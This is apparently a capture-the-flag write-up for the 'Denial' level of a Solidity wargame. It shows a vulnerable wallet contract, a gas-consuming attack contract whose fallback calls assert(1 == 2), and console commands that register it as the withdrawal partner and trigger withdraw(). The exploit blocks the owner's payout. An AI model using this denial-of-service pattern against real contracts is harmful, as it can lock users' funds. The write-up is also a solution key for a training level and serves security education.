# Denial

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds) you will win this level.

```javascript
pragma solidity ^0.4.24;

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = 0xA9E;
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance/100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)();
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    function() payable {}

    // convenience function
    function contractBalance() view returns (uint) {
        return address(this).balance;
    }
}
```

Keep eyes on the level requirement, according `withdraw()` in this contract will withdraw 1% to recipient and 1% to owner, our mission is to make `owner.transfer(amountToSend);` fail.

Therefore, if we deploy a contract which own a fallback function will `assert()` a hardcode false statement, that will run out all the gas and stop all incomming transactions. (not matter with `timeLastWithdrawn = now;` and `withdrawPartnerBalances[partner] += amountToSend;` )

```javascript
pragma solidity ^0.4.24;

contract DenialAttack {
    function () payable {
        // consume all the gas
        assert(1 == 2);
    }
}
```

Set contract address which you deploy then call instance's `withdraw()` to send ether and trigger gas-consume-all machenism.

```javascript
await contract.contractBalance()
await contract.setWithdrawPartner(0x5e1078ab3a33efbbd6bb28bacd44d3e4c2ae69bf)
await contract.withdraw()
await contract.contractBalance()
```

![](https://i.imgur.com/ylk1wEt.png)
![](https://i.imgur.com/6MUTZHS.png)
